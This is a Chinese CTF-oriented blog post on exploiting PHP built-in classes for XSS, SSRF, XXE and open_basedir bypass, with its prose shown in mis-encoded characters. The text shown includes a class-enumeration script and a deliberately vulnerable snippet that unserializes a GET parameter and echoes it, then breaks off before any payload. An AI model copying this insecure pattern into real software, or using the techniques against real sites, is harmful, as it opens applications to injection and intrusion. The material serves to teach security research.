<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="PHPåŸç”Ÿç±»åˆ©ç”¨ å‚è€ƒï¼šæ–‡ç«  - PHP åŸç”Ÿç±»çš„åˆ©ç”¨å°ç»“ - å…ˆçŸ¥ç¤¾åŒº\nPHPå†…ç½®ç±»çš„éå† 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 &lt;?php $classes = get_declared_classes(); foreach ($classes as $class) { $methods = get_class_methods($class); foreach ($methods as $method) { if (in_array($method, array( &#39;__destruct&#39;, &#39;__toString&#39;, &#39;__wakeup&#39;, &#39;__call&#39;, &#39;__callStatic&#39;, &#39;__get&#39;, &#39;__set&#39;, &#39;__isset&#39;, &#39;__unset&#39;, &#39;__invoke&#39;, &#39;__set_state&#39; // å¯ä»¥æ ¹æ®é¢˜ç›®ç¯å¢ƒå°†æŒ‡å®šçš„æ–¹æ³•æ·»åŠ è¿›æ¥, æ¥éå†å­˜åœ¨æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±» ))) { print $class . &#39;::&#39; . $method . &#34;\\n&#34;; } } } ä½¿ç”¨ Error/Exception å†…ç½®ç±»è¿›è¡Œ XSS Errorå†…ç½®ç±» é€‚ç”¨äºphp7ç‰ˆæœ¬ åœ¨å¼€å¯æŠ¥é”™çš„æƒ…å†µä¸‹ Errorç±»æ˜¯phpçš„ä¸€ä¸ªå†…ç½®ç±»ï¼Œç”¨äºè‡ªåŠ¨è‡ªå®šä¹‰ä¸€ä¸ªErrorï¼Œåœ¨php7çš„ç¯å¢ƒä¸‹å¯èƒ½ä¼šé€ æˆä¸€ä¸ªxssæ¼æ´ï¼Œå› ä¸ºå®ƒå†…ç½®æœ‰ä¸€ä¸ª __toString() çš„æ–¹æ³•ï¼Œå¸¸ç”¨äºPHP ååºåˆ—åŒ–ä¸­ã€‚å¦‚æœæœ‰ä¸ªPOPé“¾èµ°åˆ°ä¸€åŠå°±èµ°ä¸é€šäº†ï¼Œä¸å¦‚å°è¯•åˆ©ç”¨è¿™ä¸ªæ¥åšä¸€ä¸ªxssï¼Œå…¶å®æˆ‘çœ‹åˆ°çš„è¿˜æ˜¯æœ‰å¥½ä¸€äº›cmsä¼šé€‰æ‹©ç›´æ¥ä½¿ç”¨ echo çš„å†™æ³•ï¼Œå½“ PHP å¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¾“å‡ºæˆ–ä½¿ç”¨æ—¶å€™ï¼ˆå¦‚echoçš„æ—¶å€™ï¼‰ä¼šè§¦å‘__toString æ–¹æ³•ï¼Œè¿™æ˜¯ä¸€ç§æŒ–æ´çš„æ–°æ€è·¯ã€‚\n">
<title>PHPåŸç”Ÿç±»åˆ©ç”¨</title>

<link rel='canonical' href='https://0d000721999.github.io/p/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/'>

<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="PHPåŸç”Ÿç±»åˆ©ç”¨">
<meta property='og:description' content="PHPåŸç”Ÿç±»åˆ©ç”¨ å‚è€ƒï¼šæ–‡ç«  - PHP åŸç”Ÿç±»çš„åˆ©ç”¨å°ç»“ - å…ˆçŸ¥ç¤¾åŒº\nPHPå†…ç½®ç±»çš„éå† 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 &lt;?php $classes = get_declared_classes(); foreach ($classes as $class) { $methods = get_class_methods($class); foreach ($methods as $method) { if (in_array($method, array( &#39;__destruct&#39;, &#39;__toString&#39;, &#39;__wakeup&#39;, &#39;__call&#39;, &#39;__callStatic&#39;, &#39;__get&#39;, &#39;__set&#39;, &#39;__isset&#39;, &#39;__unset&#39;, &#39;__invoke&#39;, &#39;__set_state&#39; // å¯ä»¥æ ¹æ®é¢˜ç›®ç¯å¢ƒå°†æŒ‡å®šçš„æ–¹æ³•æ·»åŠ è¿›æ¥, æ¥éå†å­˜åœ¨æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±» ))) { print $class . &#39;::&#39; . $method . &#34;\\n&#34;; } } } ä½¿ç”¨ Error/Exception å†…ç½®ç±»è¿›è¡Œ XSS Errorå†…ç½®ç±» é€‚ç”¨äºphp7ç‰ˆæœ¬ åœ¨å¼€å¯æŠ¥é”™çš„æƒ…å†µä¸‹ Errorç±»æ˜¯phpçš„ä¸€ä¸ªå†…ç½®ç±»ï¼Œç”¨äºè‡ªåŠ¨è‡ªå®šä¹‰ä¸€ä¸ªErrorï¼Œåœ¨php7çš„ç¯å¢ƒä¸‹å¯èƒ½ä¼šé€ æˆä¸€ä¸ªxssæ¼æ´ï¼Œå› ä¸ºå®ƒå†…ç½®æœ‰ä¸€ä¸ª __toString() çš„æ–¹æ³•ï¼Œå¸¸ç”¨äºPHP ååºåˆ—åŒ–ä¸­ã€‚å¦‚æœæœ‰ä¸ªPOPé“¾èµ°åˆ°ä¸€åŠå°±èµ°ä¸é€šäº†ï¼Œä¸å¦‚å°è¯•åˆ©ç”¨è¿™ä¸ªæ¥åšä¸€ä¸ªxssï¼Œå…¶å®æˆ‘çœ‹åˆ°çš„è¿˜æ˜¯æœ‰å¥½ä¸€äº›cmsä¼šé€‰æ‹©ç›´æ¥ä½¿ç”¨ echo çš„å†™æ³•ï¼Œå½“ PHP å¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¾“å‡ºæˆ–ä½¿ç”¨æ—¶å€™ï¼ˆå¦‚echoçš„æ—¶å€™ï¼‰ä¼šè§¦å‘__toString æ–¹æ³•ï¼Œè¿™æ˜¯ä¸€ç§æŒ–æ´çš„æ–°æ€è·¯ã€‚\n">
<meta property='og:url' content='https://0d000721999.github.io/p/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/'>
<meta property='og:site_name' content='ç¾å’•å™œçš„å°ç«™'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='åŸç”Ÿç±»' /><meta property='article:tag' content='XSS' /><meta property='article:tag' content='SSRF' /><meta property='article:tag' content='XXE' /><meta property='article:published_time' content='2025-03-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-03-15T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/1.png' />
<meta name="twitter:title" content="PHPåŸç”Ÿç±»åˆ©ç”¨">
<meta name="twitter:description" content="PHPåŸç”Ÿç±»åˆ©ç”¨ å‚è€ƒï¼šæ–‡ç«  - PHP åŸç”Ÿç±»çš„åˆ©ç”¨å°ç»“ - å…ˆçŸ¥ç¤¾åŒº\nPHPå†…ç½®ç±»çš„éå† 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 &lt;?php $classes = get_declared_classes(); foreach ($classes as $class) { $methods = get_class_methods($class); foreach ($methods as $method) { if (in_array($method, array( &#39;__destruct&#39;, &#39;__toString&#39;, &#39;__wakeup&#39;, &#39;__call&#39;, &#39;__callStatic&#39;, &#39;__get&#39;, &#39;__set&#39;, &#39;__isset&#39;, &#39;__unset&#39;, &#39;__invoke&#39;, &#39;__set_state&#39; // å¯ä»¥æ ¹æ®é¢˜ç›®ç¯å¢ƒå°†æŒ‡å®šçš„æ–¹æ³•æ·»åŠ è¿›æ¥, æ¥éå†å­˜åœ¨æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±» ))) { print $class . &#39;::&#39; . $method . &#34;\\n&#34;; } } } ä½¿ç”¨ Error/Exception å†…ç½®ç±»è¿›è¡Œ XSS Errorå†…ç½®ç±» é€‚ç”¨äºphp7ç‰ˆæœ¬ åœ¨å¼€å¯æŠ¥é”™çš„æƒ…å†µä¸‹ Errorç±»æ˜¯phpçš„ä¸€ä¸ªå†…ç½®ç±»ï¼Œç”¨äºè‡ªåŠ¨è‡ªå®šä¹‰ä¸€ä¸ªErrorï¼Œåœ¨php7çš„ç¯å¢ƒä¸‹å¯èƒ½ä¼šé€ æˆä¸€ä¸ªxssæ¼æ´ï¼Œå› ä¸ºå®ƒå†…ç½®æœ‰ä¸€ä¸ª __toString() çš„æ–¹æ³•ï¼Œå¸¸ç”¨äºPHP ååºåˆ—åŒ–ä¸­ã€‚å¦‚æœæœ‰ä¸ªPOPé“¾èµ°åˆ°ä¸€åŠå°±èµ°ä¸é€šäº†ï¼Œä¸å¦‚å°è¯•åˆ©ç”¨è¿™ä¸ªæ¥åšä¸€ä¸ªxssï¼Œå…¶å®æˆ‘çœ‹åˆ°çš„è¿˜æ˜¯æœ‰å¥½ä¸€äº›cmsä¼šé€‰æ‹©ç›´æ¥ä½¿ç”¨ echo çš„å†™æ³•ï¼Œå½“ PHP å¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¾“å‡ºæˆ–ä½¿ç”¨æ—¶å€™ï¼ˆå¦‚echoçš„æ—¶å€™ï¼‰ä¼šè§¦å‘__toString æ–¹æ³•ï¼Œè¿™æ˜¯ä¸€ç§æŒ–æ´çš„æ–°æ€è·¯ã€‚\n"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://0d000721999.github.io/p/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/1.png' />
    <link rel="shortcut icon" href="/favicon.ico" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            localStorage.setItem(colorSchemeKey, "light");
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu988272603220494224.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ˜‹</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">ç¾å’•å™œçš„å°ç«™</a></h1>
            <h2 class="site-description">Cialloï½(âˆ ãƒ»Ï‰&lt; )âŒ’â˜…</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://buuoj.cn/users/175721'
                        target="_blank"
                        title="BUUOJ"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
  <line x1="7" y1="12" x2="13" y2="12" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/0d000721999'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/friends/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                
                <span>Friends</span>
            </a>
        </li>
        
        
        <li >
            <a href='/links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Links</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#phpå†…ç½®ç±»çš„éå†">PHPå†…ç½®ç±»çš„éå†</a></li>
    <li><a href="#ä½¿ç”¨-errorexception-å†…ç½®ç±»è¿›è¡Œ-xss">ä½¿ç”¨ Error/Exception å†…ç½®ç±»è¿›è¡Œ XSS</a>
      <ol>
        <li><a href="#errorå†…ç½®ç±»">Errorå†…ç½®ç±»</a></li>
        <li><a href="#exceptionå†…ç½®ç±»">Exceptionå†…ç½®ç±»</a></li>
        <li><a href="#ä¾‹é¢˜bjdctf-2ndxssä¹‹å…‰">ä¾‹é¢˜ï¼š[BJDCTF 2nd]xssä¹‹å…‰</a></li>
      </ol>
    </li>
    <li><a href="#ä½¿ç”¨-errorexception-å†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ">ä½¿ç”¨ Error/Exception å†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ</a>
      <ol>
        <li><a href="#ä¾‹é¢˜2020-æå®¢å¤§æŒ‘æˆ˜greatphp">ä¾‹é¢˜ï¼š[2020 æå®¢å¤§æŒ‘æˆ˜]Greatphp</a></li>
      </ol>
    </li>
    <li><a href="#ä½¿ç”¨-soapclient-ç±»è¿›è¡Œ-ssrf">ä½¿ç”¨ SoapClient ç±»è¿›è¡Œ SSRF</a>
      <ol>
        <li><a href="#soapclient-ç±»">SoapClient ç±»</a></li>
        <li><a href="#ä½¿ç”¨-soapclient-ç±»è¿›è¡Œ-ssrf-1">ä½¿ç”¨ SoapClient ç±»è¿›è¡Œ SSRF</a></li>
        <li><a href="#ä¾‹é¢˜bestphps-revenge">ä¾‹é¢˜ï¼šbestphp&rsquo;s revenge</a></li>
      </ol>
    </li>
    <li><a href="#ä½¿ç”¨-directoryiterator-ç±»ç»•è¿‡-open_basedir">ä½¿ç”¨ DirectoryIterator ç±»ç»•è¿‡ open_basedir</a>
      <ol>
        <li><a href="#directoryiteratorç±»">DirectoryIteratorç±»</a></li>
        <li><a href="#filesystemiteratorç±»">FilesystemIteratorç±»</a></li>
        <li><a href="#globiteratorç±»">GlobIteratorç±»</a></li>
        <li><a href="#splfileinfo-ç±»">SplFileInfo ç±»</a></li>
      </ol>
    </li>
    <li><a href="#ä½¿ç”¨-simplexmlelement-ç±»è¿›è¡Œ-xxe">ä½¿ç”¨ SimpleXMLElement ç±»è¿›è¡Œ XXE</a>
      <ol>
        <li><a href="#ä¾‹é¢˜suctf-2018homework">ä¾‹é¢˜ï¼š[SUCTF 2018]Homework</a></li>
      </ol>
    </li>
    <li><a href="#ä½¿ç”¨-ziparchive-ç±»æ¥åˆ é™¤æ–‡ä»¶">ä½¿ç”¨ ZipArchive ç±»æ¥åˆ é™¤æ–‡ä»¶</a>
      <ol>
        <li><a href="#ä¾‹é¢˜nepctf2021-æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­">ä¾‹é¢˜ï¼šNepCTF2021 <strong>æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­</strong></a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/">
                <img src="/p/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/1.png"
                        
                        width="1024" 
                        height="1536" 
                        loading="lazy"
                        alt="Featured image of post PHPåŸç”Ÿç±»åˆ©ç”¨" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/php/" style="background-color: #2a9d8f; color: #fff;">
                Php
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/">PHPåŸç”Ÿç±»åˆ©ç”¨</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Mar 15, 2025</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    é˜…è¯»æ—¶é•¿: 13 åˆ†é’Ÿ
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="phpåŸç”Ÿç±»åˆ©ç”¨">PHPåŸç”Ÿç±»åˆ©ç”¨
</h1><p>å‚è€ƒï¼š<a class="link" href="https://xz.aliyun.com/news/8792"  target="_blank" rel="noopener"
    >æ–‡ç«  - PHP åŸç”Ÿç±»çš„åˆ©ç”¨å°ç»“ - å…ˆçŸ¥ç¤¾åŒº</a></p>
<h2 id="phpå†…ç½®ç±»çš„éå†">PHPå†…ç½®ç±»çš„éå†
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$classes</span> <span class="o">=</span> <span class="nx">get_declared_classes</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$classes</span> <span class="k">as</span> <span class="nv">$class</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$methods</span> <span class="o">=</span> <span class="nx">get_class_methods</span><span class="p">(</span><span class="nv">$class</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$methods</span> <span class="k">as</span> <span class="nv">$method</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__destruct&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__toString&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__wakeup&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__call&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__callStatic&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__get&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__set&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__isset&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__unset&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__invoke&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__set_state&#39;</span>    <span class="c1">// å¯ä»¥æ ¹æ®é¢˜ç›®ç¯å¢ƒå°†æŒ‡å®šçš„æ–¹æ³•æ·»åŠ è¿›æ¥, æ¥éå†å­˜åœ¨æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±»
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">print</span> <span class="nv">$class</span> <span class="o">.</span> <span class="s1">&#39;::&#39;</span> <span class="o">.</span> <span class="nv">$method</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ä½¿ç”¨-errorexception-å†…ç½®ç±»è¿›è¡Œ-xss">ä½¿ç”¨ Error/Exception å†…ç½®ç±»è¿›è¡Œ XSS
</h2><h3 id="errorå†…ç½®ç±»">Errorå†…ç½®ç±»
</h3><ul>
<li>é€‚ç”¨äºphp7ç‰ˆæœ¬</li>
<li>åœ¨å¼€å¯æŠ¥é”™çš„æƒ…å†µä¸‹</li>
</ul>
<p>Errorç±»æ˜¯phpçš„ä¸€ä¸ªå†…ç½®ç±»ï¼Œç”¨äºè‡ªåŠ¨è‡ªå®šä¹‰ä¸€ä¸ªErrorï¼Œåœ¨php7çš„ç¯å¢ƒä¸‹å¯èƒ½ä¼šé€ æˆä¸€ä¸ªxssæ¼æ´ï¼Œå› ä¸ºå®ƒå†…ç½®æœ‰ä¸€ä¸ª <code>__toString()</code> çš„æ–¹æ³•ï¼Œå¸¸ç”¨äºPHP ååºåˆ—åŒ–ä¸­ã€‚å¦‚æœæœ‰ä¸ªPOPé“¾èµ°åˆ°ä¸€åŠå°±èµ°ä¸é€šäº†ï¼Œä¸å¦‚å°è¯•åˆ©ç”¨è¿™ä¸ªæ¥åšä¸€ä¸ªxssï¼Œå…¶å®æˆ‘çœ‹åˆ°çš„è¿˜æ˜¯æœ‰å¥½ä¸€äº›cmsä¼šé€‰æ‹©ç›´æ¥ä½¿ç”¨ <code>echo </code> çš„å†™æ³•ï¼Œå½“ PHP å¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¾“å‡ºæˆ–ä½¿ç”¨æ—¶å€™ï¼ˆå¦‚<code>echo</code>çš„æ—¶å€™ï¼‰ä¼šè§¦å‘<code>__toString</code> æ–¹æ³•ï¼Œè¿™æ˜¯ä¸€ç§æŒ–æ´çš„æ–°æ€è·¯ã€‚</p>
<p>ä¸‹é¢æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ Error å†…ç½®ç±»æ¥æ„é€  XSSã€‚</p>
<p>æµ‹è¯•ä»£ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
